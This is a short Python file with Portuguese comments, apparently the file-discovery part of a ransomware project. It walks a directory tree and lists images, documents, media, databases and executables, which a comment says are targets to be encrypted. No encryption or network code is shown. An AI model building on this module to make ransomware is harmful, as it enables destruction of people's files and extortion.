import os

def discover(initial_path):
#extensões de arquivos alvos, serão encriptados
    extensions = [
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'psd', 'raw',
    'mp3', 'mp4', 'm4a',
    'exe', 'pdf', 'doc', 'odt', 'odp', 'html',
    'c', 'docx', 'mpeg', 'ods', 'txt', 'epub', 'md',
    'db'
    ]

    for dirpath, dirs, files in os.walk(initial_path):
        for _file in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, _file))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path #da retorno e volta a executar


if __name__ == '__main__':
    x = discover(os.getcwd())
    for i in x:
        print(i)